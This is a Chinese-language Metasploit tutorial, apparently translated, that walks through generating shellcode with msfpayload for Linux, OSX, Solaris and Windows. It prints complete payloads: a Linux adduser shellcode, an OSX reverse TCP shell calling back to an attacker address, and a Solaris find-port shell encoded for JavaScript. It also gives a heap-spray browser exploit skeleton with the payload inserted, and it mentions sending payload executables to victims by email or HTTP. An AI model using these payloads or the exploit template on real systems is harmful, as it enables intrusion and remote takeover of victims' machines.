高级的选项包括一些你的exploit不能包含的字符,例如一个null字符因为它终止字符串且经常阻止你的exploit正常工作.编码器的选项可以允许你对你的payloads进行编码以使它遵从你的exploit的要求,例如在你正在exploit的系统中没有大写字母你需要在漏洞被利用前把payload转化成小写字母 最后的格式化选项允许你格式化产出使用于不同语言的shellcode.

在这个屏幕内,不同的payloads将会有不同的选项.

例如,如果你正使用反向连接shellcode你将需要指明攻击者机器的ip地址以便让shellcode可以反向和你相连接

如下所示，这里将使用默认选项

![enter image description here](http://drops.javaweb.org/uploads/images/01cd9bed7c2e770f6bd4cae3aa4f736f8bf84369.jpg)

如果你现在点击生成按钮,metasploit将生成你已经指明参数的shellcode.这应该类似于如下图所示：

![enter image description here](http://drops.javaweb.org/uploads/images/c7ffdb0e36bb1cf62aed5de3c2d93dbdb8da5fb3.jpg)

下面列出已经生成的shellcode;

 /*      * linux/x86/adduser - 124 bytes      * http://www.metasploit.com      * Encoder: x86/shikata_ga_nai      * PrependSetresuid=false, PrependSetreuid=false,      * PrependSetuid=false, AppendExit=false, USER=metasploit,      * PASS=metasploit, SHELL=/bin/sh      */     unsigned char buf[] =     "\xbf\x8e\x4c\x0d\x9e\x29\xc9\xd9\xec\xb1\x19\xd9\x74\x24\xf4"     "\x5a\x31\x7a\x11\x03\x7a\x11\x83\xc2\x8a\xae\xf8\xaf\x5b\xa7"     "\xc8\xba\x1d\xe0\x03\xba\xcb\x15\xc4\x8a\xc2\x47\x9c\x9f\xa7"     "\x10\x38\x08\x68\xf0\xb0\xa9\x1e\x21\x54\x5e\xbd\xb4\x75\xdf"     "\xf4\xc3\xb4\x60\x65\x23\x6e\x61\x89\xb4\x02\x04\xfd\xd5\xaf"     "\xb6\x91\x7a\x39\x43\x53\xc4\xc3\x84\xc7\x8f\x40\xb1\x33\x60"     "\x93\x0c\x69\xe3\xe1\xbe\xb7\xd3\x2f\x85\xe8\x29\x7f\x9b\x9f"     "\x23\x50\x28\x37\xb6\xf7\x45\x96\x3a\x6d\x5e\x40\x0e\xf2\x34"     "\x71\xc8\x3e\x48";

然后你把这个shellcode复制到已经指定平台的一个exploit中.因为默认格式是c然后这将被使用于一个用c编程的exploit中.如果我们有已经用perl或ruby编写好的exploit,我们将生成使用于那种语言的shellcode.

这个教程临近结束将示范一个将生成的shellcode插入到一个exploit的例子

需要记住的是Metasploit的web接口可能造成一些字符不能显示出来导致生成的shellcode不能成功执行,因此,生成shellcode最好的方法是通过Metasploit在命令行上使用msfpayload 命令生成shellcode

使用Metasploit执行”msfpayload”命令生成OSX shellcode.起初我们想启动一个bash shell（在Metasploit内已经提供） 这可以通过运行如下可执行的程序：

    C:\msf3\shell.bat

如果你现在运行”msfpayload”(没有任何选项),将显示所有Metasploit可以生成的shellcode类型

我们想生成的第一个payload是OSX PPC Reverse Tcp shell,它在Metasploit中如下面那样的被引用

*   osx/ppc/shell_reverse_tcp

下面是msfpayload命令接受选项的格式

```
    msfpayload

Output Types:

    S summary and options of payload
    C C language
    P Perl
    y Ruby
    R Raw, allows payload to be piped into msfencode and other tools
    J JavaScript
    X Windows executable
    V VBA

```

基于这些选项,我们现在知道想要的payload名了,但是不知道需要为这个payload设置什么参数.这个问题可以通过枚举msfpayload的”s”选项来解决,正如下所示

    $ msfpayload osx/ppc/shell_reverse_tcp S      Name: OSX Command Shell, Reverse TCP Inline      Version: 6479      Platform: ["OSX"]      Arch: ppc     Needs Admin: No      Total size: 164     Provided by:      hdm[hdm@metasploit.com](mailto:hdm@metasploit.com)    Basic options:     Name Current Setting Required Description     ---|||- --|||---|||---|||---|||---|||- --|||---|||---||| ---|||---|||---|||--     LHOST yes The local address     LPORT 4444 yes The local port

描述:

反向连接到攻击者并产出一个命令shell

我们可以看到我们自定义的LHOST和LPORT变量.下一个选项是输出类型.对于这个例子来说我们坚持使用”c”(c 编程语言）.因此,执行以下命令生成我们的shellcode

```
$ msfpayload osx/ppc/shell_reverse_tcp LHOST=10.1.1.100,LPORT=1337 C
    /*
     * osx/ppc/shell_reverse_tcp - 164 bytes
     * http://www.metasploit.com
     * LHOST=10.1.1.100, LPORT=1337, PrependSetresuid=false,
     * PrependSetreuid=false, PrependSetuid=false, AppendExit=false
     */
    unsigned char buf[] =
    "\x38\x60\x00\x02\x38\x80\x00\x01\x38\xa0\x00\x06\x38\x00\x00"
    "\x61\x44\x00\x00\x02\x7c\x00\x02\x78\x7c\x7e\x1b\x78\x48\x00"
    "\x00\x0d\x00\x02\x05\x39\x0a\x01\x01\x64\x7c\x88\x02\xa6\x38"
    "\xa0\x00\x10\x38\x00\x00\x62\x7f\xc3\xf3\x78\x44\x00\x00\x02"
    "\x7c\x00\x02\x78\x38\xa0\x00\x02\x38\x00\x00\x5a\x7f\xc3\xf3"
    "\x78\x7c\xa4\x2b\x78\x44\x00\x00\x02\x7c\x00\x02\x78\x38\xa5"
    "\xff\xff\x2c\x05\xff\xff\x40\x82\xff\xe5\x38\x00\x00\x42\x44"
    "\x00\x00\x02\x7c\x00\x02\x78\x7c\xa5\x2a\x79\x40\x82\xff\xfd"
    "\x7c\x68\x02\xa6\x38\x63\x00\x20\x90\x61\xff\xf8\x90\xa1\xff"
    "\xfc\x38\x81\xff\xf8\x38\x00\x00\x3b\x7c\x00\x04\xac\x44\x00"
    "\x00\x02\x2f\x62\x69\x6e\x2f\x63\x73\x68\x00\x41\x41\x41";

```

一个例子是使用c写的exploit”Intelli Tamper2.0.7(html解析器）Remote Buffer Overflow Exploit”.你可以在这里找到

    (Project Shellcode Download: http://www.projectshellcode.com/downloads/milw0rm-6121.c)

使用JavaScript（Unicode）把通过Metasploit执行”msfpayload”命令生成的Solaris shellcode进行编码

通过Metasploit生成的shellcode是独立平台的,所以的处理细节和上面的没啥不同.为了证明这个观点我们将单步调试以下生成的payload

    - solaris/x86/shell_find_port

这个类型的Payload通常因”Connect Reuse”或”Find Port”shellcode而出名。当尝试exploit一台在防火墙（它的入站和出站规则已经被锁定以致没有可用的入站的端口关闭或出站的端口开放）后的主机时,这种shellcode的技术是有用的。这种安装可以阻止使用端口绑定或反向连接的payload的攻击者.因为它们将会被防火墙隔离.

在防火墙使用NAT连接到主机时，因为防火墙将终止了攻击者在防火墙上建立的连接,同时创建一个新连接,它把一个防火墙和带有新的源端口的主机连接起来.类似地,如果连接经过一个代理,会在目标和代理之间创建一个新的连接.当shellcode搜索攻击者的源端口时,shellcode将无法找到它同时shellcode也无法正常工作.因为这个原因,Metasploit有一个命名为”find_tag”的不同类型的payload,它在建立好的连接上放置了一个预定义的”tag”.这种payload在建立好的连接中找到标签同时可以识别出相关联的连接

在这个小小的说明之后,我们想做的第一件事是使用如下命令判断这个payload需要哪个选项.

```
$ msfpayload solaris/x86/shell_find_port S
     Name: Solaris Command Shell, Find Port Inline
     Version: 6479
     Platform: ["Solaris"]
     Arch: x86
    Needs Admin: No
     Total size: 136
    Provided by:
     Ramon de Carvalho Valle<ramon@risesecurity.org>
    Basic options:
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    CPORT 64865 no The local client port

```

在一个建立好的连接上产出一个shell

既然这样仅仅使用到的变量是CPORT,它有一个默认的值.总之,我们将在命令行上指明它

这些天在软件领域中大量客户端方面的漏洞都被传出来了,例如Internet Explorer,Adobe Reader, Microsoft Office,等等。通常是把exploit和shelcode注入到一个有害的html页面中来利用这些漏洞.因为大多数shellcode包含了二进制数据,且不能直接被插入到一个网页中.既然这样,使用Unicode Encoding对它进行编码以让它可以被放入到一个JavaScript函数中,并使用unescape()函数进行解码.当然,Metasploit在msfpayload中使用Unicode encoding自动化地对shellcode进行编码时,提供了JavaScript（或J）选项.如下命令：

    $ msfpayload solaris/x86/shell_find_port CPORT=1337 J     // solaris/x86/shell_find_port - 86 bytes     // http://www.metasploit.com     // CPORT=1337, PrependSetreuid=false, PrependSetuid=false,     // AppendExit=false     %udb31%ue3f7%u8953%u68e7%ud8ff%u3cff%u656a%ue689%u56f7%uf604     %u5716%u91b3%u5353%ub754%u5354%u5850%u5040%u366a%uff58%u66d6     %u7f81%u0502%u7539%u58f0%u6a50%u5009%u3e6a%uff58%uffd6%ue04f     %uf679%u6850%u2f2f%u6873%u2f68%u6962%u896e%u50e3%u8953%u50e1     %u5351%u3bb0%ud6ff

正如这个例子所述的,一个客户端的exploit可能包含如下小段代码,这个地方被插入了payload

```
<SCRIPT language="javascript">
        var heapSprayToAddress = 0x05050505;
        var payLoadCode = unescape("insertpayloadhere");
        var heapBlockSize = 0x400000;
        ...

```

可以简单的把已经生成的shellcode复制到这个exploit的”insertpayloadhere”区域中.通常你将找到已经包含这些shellcode的一个exploit,例如一种绑定端口的payload.你仅仅用你自己的shellcode替换掉它来自定义你目标环境的exploit.

```
<SCRIPT language="javascript">
     var heapSprayToAddress = 0x05050505;
     var payLoadCode = unescape("%udb31%ue3f7%u8953%u68e7%ud8ff%u3cff%u656a
     %ue689%u56f7%uf604%u5716%u91b3%u5353%ub754%u5354%u5850%u5040%u366a%uff58
     %u66d6%u7f81%u0502%u7539%u58f0%u6a50%u5009%u3e6a%uff58%uffd6%ue04f%uf679
     %u6850%u2f2f%u6873%u2f68%u6962%u896e%u50e3%u8953%u50e1%u5351%u3bb0%ud6ff");
     var heapBlockSize = 0x400000;
        ...

```

使用Metasploit执行”msfpayload”命令生成像一个Windows可执行程序那样的shellcode.

Metasploit提供一种功能,这种功能可以输出已经生成的payload.它就像一个windows可执行程序那样的.事实上正如你期待做的,这种功能对于测试生成的shellcode来说是有用的.以及通过email,HTTP给受害者发送可执行的程序,甚至是通过一个”Downlaod and Execute”payload给受害者发送可执行的程序.

当一个exploit仅有一个可以被shellcode插入的小的缓冲区时，一个Download and Execute payload是有用的.这可以限制在exploit中使用的payload.使用设计好的shellcode可能被限制,它起初是一个被插入到exploit中的小型payload.并被设计来下载更大的payload以扩展这个shellcode的功能。另一个选择是使用一个Download and Execute payload.起初这个小型payload不过是被设计于从攻击者的web服务器中下载一个可执行程序并在系统上执行.在系统上,这种shellcode为后门提供了特性更加丰富的特性.

在受害者系统上下载一个可执行的程序,这有可能被反病毒软件捕获-如果受害者已经装了它

为了演示在Metasploit内生成windows可执行程序这里将使用”windows/exec”payload.需要决定为这个payload提供的哪个选项,正如我们事先使用的Summary（S）选项那样：

```
$ msfpayload windows/exec S
     Name: Windows Execute Command
     Version: 5773
     Platform: ["Windows"]
     Arch: x86
    Needs Admin: No
     Total size: 113
    
    Provided by:
     vlad902 <vlad902@gmail.com>
    Basic options:
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    CMD yes The command string to execute
    EXITFUNC thread yes Exit technique: seh, thread, process

```

描述:

执行一个你想要的命令

需要指明”CMD”选项.仅仅将执行”calc.exe”以便可以在自己的系统上测试它.为了使用Metasploit生成一个可执行windows程序,我们也可以指定X选项.这将把可执行程序显示到屏幕上,所以我们需要一个管道让它指向一个文件（将会调用的pscalc.exe文件）,如下所示：

    $ msfpayload windows/exec CMD=calc.exe X > pscalc.exe     Created by msfpayload (http://www.metasploit.com).     Payload: windows/exec      Length: 121     Options: CMD=calc.exe

你现在应该有一个命名为”pscalc.exe”的可执行的文件在当前目录中.你可以使用如下命令来确认:

$ ls -l pscalc.exe

可以看到这个文件没有执行权限,因此需要使用如下命令为它设置可执行权限

    $ chmod 755 pscalc.exe

你现在可以通过执行windows的可执行程序”pscalc.exe”来测试你的shellcode.下面的命令应该触发Windows Calculator而显示在你的系统上.

    $ ./pscalc.exe

这在下图中已经示范了:

![enter image description here](http://drops.javaweb.org/uploads/images/62cf9d22a70737e0415274a3cd962bbba2f56d07.jpg)

恭喜！ 你已经使用Metasploit Exploit Framework 以不同的格式为四种不同平台的生成了四种不同类型的shellcode.